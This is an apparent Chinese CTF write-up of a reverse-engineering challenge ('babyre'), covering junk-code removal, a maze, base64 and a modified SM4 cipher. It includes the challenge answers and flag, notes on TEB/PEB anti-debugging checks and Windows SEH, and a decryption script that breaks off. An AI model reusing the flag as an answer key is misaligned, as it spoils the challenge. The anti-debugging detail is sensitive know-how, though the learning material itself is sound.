<h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>我佛了<br>还有非预期。。。被我撞上了<br>首先就是去花，直接手去了,很简单的花而已这边不演示<br><img src="16.png" srcset="/img/loading.gif" lazyload alt="16"><br>第一个问题是maze，输入sxss直接完事了。。。<br>后来看了wp发现居然不一样，十分蒙蔽。。。<br>//说到底还是tcl，没看出来这是立体迷宫<br>//但是后来又想了想还是觉得这迷宫出的有点hape<br>然后就是一个base64解码操作，函数也有花轻松去<br><img src="17.png" srcset="/img/loading.gif" lazyload alt="17"><br>可以看到很明显的解码操作<br>直接把比较字符串加密就ok了<br>c2N0Zl85MTAy<br>然后最后也是我最烦的加密算法<br>看了wp发现是魔改sm4<br>当时看出来是sm4了，国赛的sm4我直接把密钥倒着输出的答案<br>//国赛那个后来知道是sm4，再看看这题的算法和国赛的是分相似，所以可以推断sm4<br>但是这个魔改的只看到一个box。。。瞬间懵逼。。。<br>//其实就是太懒了没仔细看，仔细看马上就知道怎么写<br>看了wp才写出来的<br>fl4g_is_s0_ug1y!</p>
<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>这边主要总结一下俩个<br>一个是涉及的seh，还有一个就是sm4逆向</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TEB-Thread-Environment-Block，线程环境块"><a href="#TEB-Thread-Environment-Block，线程环境块" class="headerlink" title="TEB(Thread Environment Block，线程环境块)"></a>TEB(Thread Environment Block，线程环境块)</h3><p>先了解一下前置只是tep线程管理<br>就是一个存放线程信息的一个结构体<br>每个线程维护着自己的一个TEB，且可以通过FS寄存器直接根据offset提取信息，很是方便。</p>
<h3 id="TIB-Thread-Information-Block，线程信息块"><a href="#TIB-Thread-Information-Block，线程信息块" class="headerlink" title="TIB(Thread Information Block，线程信息块)"></a>TIB(Thread Information Block，线程信息块)</h3><p>offset为0<br>ExceptionList，即指向_EXCEPTION_REGISTRATION_RECORD结构的指针链表，和SEH相关，涉及到异常处理<br>stackBase，该线程的stack地址<br>stackLimit，该线程的stack的limit，实际上就是栈的结束位置<br>self，即指向TEB的指针，在程序中看到的fs:[0x18]也就是拿到了TEB</p>
<h3 id="ProcessEnvironmentBlock"><a href="#ProcessEnvironmentBlock" class="headerlink" title="ProcessEnvironmentBlock"></a>ProcessEnvironmentBlock</h3><p>指向的是PEB，在程序中常见的ptr fs:[0x30]也就是拿到了PEB的地址，因为现在的windows已经有了地址随机化的功能，所以基本上都是用这种方式来拿到PEB的</p>
<h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>这个就很熟悉了，毕竟和反调试有点关系<br>当我们找到了TEB时实际上我们也就找到了PEB（Thread Environment Block，线程环境块）<br>通过FS:[0x30]我们就可以轻松的拿到PEB的地址<br>实际上PEB是一个进程内核对象，在没有开启随机化的情况下，它的地址在32位上就是0x7ffd7000，很明显是一个用户空间的可访问数据，当为了能在具体运行环境下拿到他的地址还是FS:[0x30]更为保险，当然也可以通过EPROCESS来访问，不过一是EPROCESS位于内核空间，访问需要Ring0权限，二来和要讨论的LDR调试也没关系，所以这里就不提了</p>
<h3 id="BeingDebugged-amp-amp-NtGlobalFlag"><a href="#BeingDebugged-amp-amp-NtGlobalFlag" class="headerlink" title="BeingDebugged &amp;&amp;NtGlobalFlag"></a>BeingDebugged &amp;&amp;NtGlobalFlag</h3><p>前面记录过这个<br>是用来判断我们是否处于调试状态的<br>win32有个API叫做IsDebuggerPresent<br>就是通过拿到它来判断程序是不是处于被调试状态的<br>你可以用它来实现最最简单的反调试，下面就是函数的源码：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">IsDebuggerPresent(VOID)<br>&#123;<br>    <span class="hljs-keyword">return</span> NtCurrentPeb<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>BeingDebugged;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>那你可能又会想了，为什么这么简单，如果我们在调试过程中手动修改内存不就可以绕过了吗？<br>其实没那么简单，<br>BeingDebufgged被设置为了true会导致一系列的“连锁反应”<br>首先是NtGlobalFlag修改<br>然后就是RtlCreateHeap会调用RtlDebugCreateHeap创建调试堆<br>这里面有很多0xbaadf00d前面讲过</p>
<h2 id="SEH异常处理"><a href="#SEH异常处理" class="headerlink" title="SEH异常处理"></a>SEH异常处理</h2><p>首先什么是异常？<br>异常就是对于非预期状况的处理<br>当我们运行某个程序出现了异常状况，就会进入异常处理流程<br>发现异常 -&gt; 寻找处理异常的方法 -&gt; 恢复执行或者发生错误<br>其中异常还分为软件异常和硬件异常，硬件异常有涉及中断，系统调用等行为</p>
<h3 id="硬件异常"><a href="#硬件异常" class="headerlink" title="硬件异常"></a>硬件异常</h3><p>硬件异常主要分为三种</p>
<h4 id="fault"><a href="#fault" class="headerlink" title="fault"></a>fault</h4><p>在处理此类异常时，操作系统会将遭遇异常时的“现场”保存下来（比如EIP、CS等寄存器的值），然后将调用相应的异常处理函数，如果对异常的处理成功了（没成功的情况会在下文中提到），那就恢复到原始现场，继续执行。最经典的fault例子莫过于Page Fault了，在分页机制下，当我们读到某个还未载入到内存的页时，就会触发该异常，操作系统会将该页载入内存，然后重新执行读取该页的指令，这是分页机制实现的重要机制。</p>
<h4 id="trap"><a href="#trap" class="headerlink" title="trap"></a>trap</h4><p>在处理此类异常时，操作系统会将异常的“下文”保存，在处理异常后，直接执行导致异常的指令的下一条指令。我们在调试过程中常用的断点操作就是基于这类异常的，当我们在某处下断点时调试器会将原本此处的指令对应的十六进制保存下来，然后替换第一个字节替换为0xCC的，也就是int 3，造成断点异常，中断（此处的中断用的是break，而我们一般说的中断是interrupt，请读者务必区分清楚）到调试器，程序在运行到此处就会停止等待下一步的指令，而当我们继续执行时调试器就会将该指令替换为原来的指令，程序也就恢复正常执行了。不知道大家有没有注意过，在进行程序调试时经常会看见hex界面显示大量的“烫烫烫”，这其实是0xcc对应的中文字符，因为这些地址的内容程序并不想让我们访问，一旦我们访问这些地址，就会读到0xcc，程序也就“中断”了。</p>
<h4 id="abort"><a href="#abort" class="headerlink" title="abort"></a>abort</h4><p>中止异常，主要是处理严重的硬件错误等，这类异常不会恢复执行，会强制性退出。<br>在windows系统中，硬件异常和中断被不加区分的存放在了一个向量表中，也就是我们常说的IDT（interruption descriptor table）<br>真正的IDT实际上是维护了多个门描述符（GD），每一项大小为8（64位为16），IDRT寄存器中保存着IDT的基地址，我们想具体找某个GD的话直接利用IDTR+8*offset即可。<br>GD大致由segment selector（段选择子）、offset（选定段后的偏移）、DPL（描述符特权级）、P（段是否存在）组成<br>当windows系统启动时，winLoad会在实模式下分配一块内存，使用CLI指令来禁止中断的使用，利用LIDT（Load IDT）指令将IDT表的位置和长度等信息交给CPU，接着系统恢复保护模式，这时的执行权交还给了入口函数，调用SIDT（set IDT）拿到之前存储的IDT的信息，并将其记录到PCR中，接着其他处理器也会进行初始化的操作，复制并修改自己的IDT，在一切准备就绪后，调用STL指令恢复中断的使用。调用的函数链如下：<br>winLoad -&gt; kiSystemStartup -&gt; kiInitializePcr -&gt;keStartAllProcessors -&gt; kiInitProcessors</p>
<h3 id="软件异常"><a href="#软件异常" class="headerlink" title="软件异常"></a>软件异常</h3><p>软件异常是由操作系统或应用程序产生的，它又包含了windows为我们定义好的异常处理和我们自己写的异常处理（各种编程语言中的try-catch结构）。<br>这类异常追根溯源都是基于RaiseException这个用户态API和NtRaiseException的内核服务建立起来的。<br>RaiseException的函数原型：<br>void RaiseException(DWORD dwExceptionCode , DWORD dwExceptionFlags,DWORD nNumberofArguments,const DWORD* lpArguments);</p>
<h3 id="异常的的分发处理"><a href="#异常的的分发处理" class="headerlink" title="异常的的分发处理"></a>异常的的分发处理</h3><h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>内核态的就略过了，因为一般ctf钟都是与user相关<br>user的异常处理就类似我们平常编程中的try catch<br>在调试下会判断是否给调试器处理异常</p>
<h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><p>。。。。。。<br>看了半天的书硬是没看懂<br>都看蒙蔽了<br>和当年看pe文件结构一个样<br>参考加密与解密 and 简书某dalao<br>功能<br>SEH实际包含两个主要功能：结束处理（termination handling）和异常处理（exception handling)<br>每当你建立一个try块，它必须跟随一个finally块或一个except块。<br>一个try块之后不能既有finally块又有except块。但可以在try-except块中嵌套try-finally块，反过来 也可以。<br>__try,__finally关键字用来标出结束处理程序两段代码的轮廓<br>不管保护体（try块） 是如何退出的。不论你在保护体中使用return，还是goto，或者是longjump，结束处理程序 （finally块）都将被调用。<br>在try使用__leave关键字会引起跳转到try块的结尾<br>TIB结构:在用户模式下，TIB(ThreadInformationBlock)位于TEB的头部。而TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TEB。</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">nt!_TEB<br>   +<span class="hljs-number">0</span>x000 NtTib            : _<span class="hljs-type">NT_TIB</span><br>   +<span class="hljs-number">0</span>x01c EnvironmentPointer : <span class="hljs-type">Ptr32</span> Void<br></code></pre></td></tr></table></figure>
<p>下面是TIB结构</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust">typedef <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_NT_TIB</span></span>          <span class="hljs-comment">//sizeof  1ch</span><br>&#123;<br> <span class="hljs-number">00</span>h   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_EXCEPTION_REGISTRATION</span></span>  *ExceptionList;          <span class="hljs-comment">//SEH链入口</span><br> <span class="hljs-number">04</span>h   PVOID                            StackBase;              <span class="hljs-comment">//堆栈基址</span><br> <span class="hljs-number">08</span>h   PVOID                            StackLimit;             <span class="hljs-comment">//堆栈大小</span><br> <span class="hljs-number">0</span>ch   PVOID                            SubSystemTib;<br>       <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>           PVOID                FiberData;<br> <span class="hljs-number">10</span>h       DWORD                Version;<br>       &#125;;<br> <span class="hljs-number">14</span>h   PVOID                            ArbitraryUserPointer;<br> <span class="hljs-number">18</span>h   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_NT_TIB</span></span>                   *<span class="hljs-keyword">Self</span>;                  <span class="hljs-comment">//本NT_TIB结构自身的线性地址</span><br>&#125;NT_TIB;<br></code></pre></td></tr></table></figure>
<p>所以流程图一般是这样的</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+---------+    +----------------+      +---------------+<br>|<span class="hljs-string"> 发生异常 +---&gt;+   TIB          +-----&gt;+   Next        +--+</span><br>|<span class="hljs-string">         </span>|<span class="hljs-string">    </span>|<span class="hljs-string">   fs:[0]       </span>|<span class="hljs-string">      +---------------+  </span>|<span class="hljs-string">            +------------------+</span><br><span class="hljs-string">+---------+    +----------------+      </span>|<span class="hljs-string">   Handler     +--------------&gt;+  异常处理函数     </span>|<br>                                       +---------------+  |<span class="hljs-string">            </span>|<span class="hljs-string">  ...             </span>|<br>                                                          |<span class="hljs-string">            </span>|<span class="hljs-string">  retn            </span>|<br>                                               +----------+            +------------------+<br>                                               |<br><span class="hljs-string">                                       +-------v-------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">   Next        +--+</span><br><span class="hljs-string">                                       +---------------+  </span>|<span class="hljs-string">            +------------------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">   Handler     +--------------&gt;+  异常处理函数     </span>|<br>                                       +---------------+  |<span class="hljs-string">            </span>|<span class="hljs-string">  ...             </span>|<br>                                                          |<span class="hljs-string">            </span>|<span class="hljs-string">  retn            </span>|<br>                                               +----------+            +------------------+<br>                                               |<br><span class="hljs-string">                                       +-------v-------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">  FFFFFFh      </span>|<br>                                       +---------------+               +------------------+<br>                                       |<span class="hljs-string">   Handler     +--------------&gt;+  异常处理函数     </span>|<br>                                       +---------------+               |<span class="hljs-string">  ...             </span>|<br>                                                                       |<span class="hljs-string">  retn            </span>|<br>                                                                       +------------------+<br></code></pre></td></tr></table></figure>
<p>next是下一个链的地址。如果next的值是FFFFFFh,表示是链表的最后一个节点，该节点的回调函数是系统设置的一个终结处理函数，所有无人值守的异常都会到达这里。<br>异常处理函数可以是自定义的函数，系统有一个默认的函数，但我们可以自定义一个异常处理函数，让它来处理。<br>示例代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exception_memory_access_violation</span><span class="hljs-params">(LPEXCEPTION_POINTERS p_exinfo)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span> (p_exinfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)<br>	&#123;<br>		<span class="hljs-keyword">return</span>  EXCEPTION_EXECUTE_HANDLER; <span class="hljs-comment">//handle this exception</span><br>	&#125;<br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH; <span class="hljs-comment">//Do not handle this exception</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">char</span>* mem = <span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;<br>	__try &#123;<br>		*mem = <span class="hljs-number">0</span>; <span class="hljs-comment">//throw exception</span><br>	&#125;<br>	__except (exception_memory_access_violation(GetExceptionInformation()))  <span class="hljs-comment">//handler</span><br>	&#123;<br>		<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Memory error in except&quot;</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>逆向分析<br><img src="18.png" srcset="/img/loading.gif" lazyload alt="18"><br>果然ida没反编译出来。。。<br>ida貌似不能反编译try catch这种异常处理<br>但是看汇编流程图还是能看到<br><img src="19.png" srcset="/img/loading.gif" lazyload alt="19"><br>函数一开始就把seh结构体push进去了<br>在结构体那边的地址断点就ok了<br>//具体是怎么样还不是很清楚。。。<br>//这个坑以后再好好填<br>//第一次遇到，下次写题一定要认出来啊</p>
<h3 id="魔改sm4"><a href="#魔改sm4" class="headerlink" title="魔改sm4"></a>魔改sm4</h3><p>这个魔改的其实写起来特别简单<br>由前四输入推出第五个，然后不断循环<br>解密只需要用后四推出前面就行了<br>本来想用骚操作patch来写。但是失败了不知道为啥</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">#define <span class="hljs-keyword">ROL</span>(x, r)  (((x) &lt;&lt; (r)) | ((x) &gt;&gt; (<span class="hljs-number">32</span> - (r))))<br>#define <span class="hljs-keyword">ROR</span>(x, r)  (((x) &gt;&gt; (r)) | ((x) &lt;&lt; (<span class="hljs-number">32</span> - (r))))<br>unsigned char v3[<span class="hljs-number">288</span>]=&#123;<span class="hljs-number">0x0D6</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0E9</span>, <span class="hljs-number">0x0FE</span>, <span class="hljs-number">0x0CC</span>, <span class="hljs-number">0x0E1</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x0B7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0B6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0C2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x0FB</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x0BE</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x0C3</span>, <span class="hljs-number">0x0AA</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x0F4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x0EF</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0ED</span>, <span class="hljs-number">0x0CF</span>, <span class="hljs-number">0x0AC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E4</span>, <span class="hljs-number">0x0B3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x0A9</span>, <span class="hljs-number">0x0C9</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x0E8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x0DF</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x0FA</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0A6</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x0A7</span>, <span class="hljs-number">0x0FC</span>, <span class="hljs-number">0x0F3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x0BA</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x0E6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x0A8</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x0B2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x0DA</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0F8</span>, <span class="hljs-number">0x0EB</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0D1</span>, <span class="hljs-number">0x0A2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x0D4</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0D3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x0E7</span>, <span class="hljs-number">0x0A0</span>, <span class="hljs-number">0x0C4</span>, <span class="hljs-number">0x0C8</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x0EA</span>, <span class="hljs-number">0x0BF</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x0D2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x0C7</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0B5</span>, <span class="hljs-number">0x0A3</span>, <span class="hljs-number">0x0F7</span>, <span class="hljs-number">0x0F2</span>, <span class="hljs-number">0x0CE</span>, <span class="hljs-number">0x0F9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x0A1</span>, <span class="hljs-number">0x0E0</span>, <span class="hljs-number">0x0AE</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x0A4</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0AD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0F5</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0B1</span>, <span class="hljs-number">0x0E3</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x0F6</span>, <span class="hljs-number">0x0E2</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x0CA</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x0C0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x0AB</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x0D5</span>, <span class="hljs-number">0x0DB</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x0DE</span>, <span class="hljs-number">0x0FD</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x0FF</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x0AF</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x0BB</span>, <span class="hljs-number">0x0DD</span>, <span class="hljs-number">0x0BC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x0D9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x0D8</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0C1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x0A5</span>, <span class="hljs-number">0x0CD</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0BD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0D0</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x0B8</span>, <span class="hljs-number">0x0E5</span>, <span class="hljs-number">0x0B4</span>, <span class="hljs-number">0x0B0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x0B9</span>, <span class="hljs-number">0x0F1</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x0C5</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x0C6</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x0F0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x0EC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0DC</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x0EE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x0D7</span>, <span class="hljs-number">0x0CB</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x0C6</span>, <span class="hljs-number">0x0BA</span>, <span class="hljs-number">0x0B1</span>, <span class="hljs-number">0x0A3</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x0AA</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x0DC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x0B2</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>&#125;<span class="hljs-comment">;</span><br><br>__int64 __fastcall sub_564F32EDB464(unsigned <span class="hljs-keyword">int</span> a1)<br>&#123;<br>    unsigned <span class="hljs-keyword">int</span> v1<span class="hljs-comment">;</span><br>  v1 = (v3[(BYTE2(a1))&amp;<span class="hljs-number">0xff</span>] &lt;&lt; <span class="hljs-number">16</span>) | v3[a1&amp;<span class="hljs-number">0xff</span>] | (v3[(BYTE1(a1))&amp;<span class="hljs-number">0xff</span>] &lt;&lt; <span class="hljs-number">8</span>) | (v3[(a1 &gt;&gt; <span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span>] &lt;&lt; <span class="hljs-number">24</span>)<span class="hljs-comment">;</span><br>  return <span class="hljs-keyword">ROL</span>(v1,<span class="hljs-number">12</span>)^<span class="hljs-keyword">ROL</span>(v1,<span class="hljs-number">8</span>)^<span class="hljs-keyword">ROR</span>(v1,<span class="hljs-number">2</span>)^<span class="hljs-keyword">ROR</span>(v1,<span class="hljs-number">6</span>)<span class="hljs-comment">;</span><br>&#125;<br>__int64 __fastcall sub_564F32EDB43B(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3, unsigned <span class="hljs-keyword">int</span> a4)<br>&#123;<br>    return a1 ^ (unsigned <span class="hljs-keyword">int</span>)sub_564F32EDB464(a2 ^ a3 ^ a4)<span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">int</span> main()<br>&#123;<br>    unsigned <span class="hljs-keyword">int</span> tmp[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;<span class="hljs-comment">;</span><br>    unsigned <span class="hljs-keyword">int</span> cipher[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0xBE040680</span>, <span class="hljs-number">0xC5AF7647</span>, <span 